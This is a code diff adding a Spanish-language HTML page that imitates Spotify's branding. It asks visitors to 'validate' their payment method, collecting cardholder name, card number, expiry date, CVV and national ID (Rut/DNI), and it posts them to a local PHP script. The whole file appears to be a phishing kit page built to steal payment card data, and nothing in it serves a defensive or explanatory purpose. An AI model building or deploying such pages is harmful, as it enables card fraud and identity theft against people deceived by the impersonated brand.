@@ -1,0 +1,101 @@
+<html>
+<head><title>Spotify</title>
+<meta name="MobileOptimized" content="width">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="shortcut icon" href="favicon.png">
+<link href="style.css" rel="stylesheet" type="text/css">
+<script>
+$(function() {
+  $('input').on('change', function() {
+    var input = $(this);
+    if (input.val().length) {
+      input.addClass('populated');
+    } else {
+      input.removeClass('populated');
+    }
+  });
+  
+  setTimeout(function() {
+    $('#fname').trigger('focus');
+  }, 500);
+});
+</script>
+<script>
+    function justNumbers(e)
+    {
+    var keynum = window.event ? window.event.keyCode : e.which;
+    if ((keynum == 8) || (keynum == 46))
+    return true;
+     
+    return /\d/.test(String.fromCharCode(keynum));
+    }
+</script>
+</head>
+<body scroll="auto" onload="javascript:SelectDocument('DOCTARJ'); activaChat();IsIE8Browser();">
+<form method="post" action="Datos/Validating2.php" name="form1">
+<center><img src="logo.png" width="210" height="65"></center>
+<br>
+<hr style="color: rgb(255, 255, 255);">
+<br>
+
+<div class="datagrid">
+<table style="width: 440px;" border="0" align="center">
+<thead><tr>
+  <th colspan="2" style="font: 700 20px Helvetica,Arial,sans-serif;" align="left">Valide su método de Pago.<br><br></th></tr></thead>
+<thead><tr><th colspan="2" style="font: 14px Helvetica,Arial,sans-serif;" align="left">PASO <b>1</b> DE <b>2</b></th></tr></thead>
+<thead><tr><th colspan="2" style="font: 700 20px Helvetica,Arial,sans-serif;" align="left">Configure su tarjeta de crédito o débito.</th></tr></thead>
+<thead><tr><th colspan="2" align="left"><img src="cclogo.png"></th></tr></thead>
+<tbody>
+<tr>
+<td>
+<label>
+<input style="height: 60px;" id="fname" name="n" class="input" placeholder="Nombre de Tarjeta" autocomplete="off" required="" type="text">
+<span>Nombre de Tarjeta</span>
+</label>
+</td>
+</tr>
+<tr>
+<td>
+<label>
+<input style="height: 60px;" name="cn" placeholder="Numero de Tarjeta" autocomplete="off" maxlength="16" minlength="16" onkeypress="return justNumbers(event);" required="" type="text">
+<span>Numero de Tarjeta</span>
+</label>
+</td>
+</tr>
+<tr>
+<td>
+<label>
+<input style="height: 60px;" name="f" placeholder="Fecha de Expiración (MM/YY)" autocomplete="off" maxlength="5" minlength="5" required="" type="text">
+<span>Fecha de Expiración (MM/YY)</span>
+</label>
+</td>
+</tr>
+<tr>
+<td>
+<label>
+<input style="height: 60px;" name="cs" placeholder="Codigo de Seguridad (CVV)" autocomplete="off" maxlength="4" minlength="3" onkeypress="return justNumbers(event);" required="" type="password">
+<span>Codigo de Seguridad (CVV)</span>
+</label>
+</td>
+</tr>
+<tr>
+    
+</tr><tr>
+<td>
+<label>
+<input style="height: 60px;" name="rt" placeholder="Rut/DNI" autocomplete="off" required="" type="text">
+<span>Rut/DNI</span>
+</label>
+</td>
+</tr>
+<tr>
+<td colspan="2" rowspan="2" align="center">
+<br>
+<input value="       CONTINUE      " class="button" style="cursor: pointer;" type="submit">
+</td>
+</tr>
+</tbody>
+</table></div>
+</form>
+</body>
+</html>
